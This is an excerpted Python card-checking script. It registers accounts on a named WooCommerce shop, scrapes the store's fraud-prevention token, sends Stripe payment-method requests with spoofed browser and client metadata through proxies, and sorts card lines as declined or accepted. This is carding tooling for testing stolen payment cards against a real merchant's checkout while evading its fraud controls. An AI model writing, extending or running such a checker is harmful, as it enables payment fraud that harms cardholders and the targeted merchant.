...
RESPONSE_MAP = {
    "card was declined": ("Declined", "Your card was declined❌.", False),
    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            try:
                ...
                headers_main = {
                    "referer": "https://redbluechair.com/my-account/add",
                }
                resp_main = await session.get(
                    "https://redbluechair.com/my-account/",
                ...
                data_register = {
                    ...
                    "wc_order_attribution_session_entry": "https://redbluechair.com/my-account/add",
                ...
                # 3. GET add-payment-method page to extract keys and token
                headers_payment = {
                    "referer": "https://redbluechair.com/my-account/payment-methods/",
                }
                resp_payment = await session.get(
                    "https://redbluechair.com/my-account/add-payment-method/",
                ...
                token_match = re.search(r"window\.wcpayFraudPreventionToken\s*=\s*['\"]([^'\"]+)['\"]", html_payment)
                if not token_match:
                    return "Error", "Could not extract fraud prevention token", False
                fraud_token = token_match.group(1)
                ...
                data_pm = {
                    ...
                    "payment_user_agent": "stripe.js%2Fbd19e99ebe%3B+stripe-js-v3%2Fbd19e99ebe%3B+payment-element%3B+deferred-intent",
                    ...
                    "client_attribution_metadata[elements_session_id]": "elements_session_1XSNy3mIfw4",
                ...
                data_ajax = {
                    ...
                    "wcpay-fraud-prevention-token": fraud_token,
                    "wcpay-fingerprint": tok,
                }
...
async def process_ST_2(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
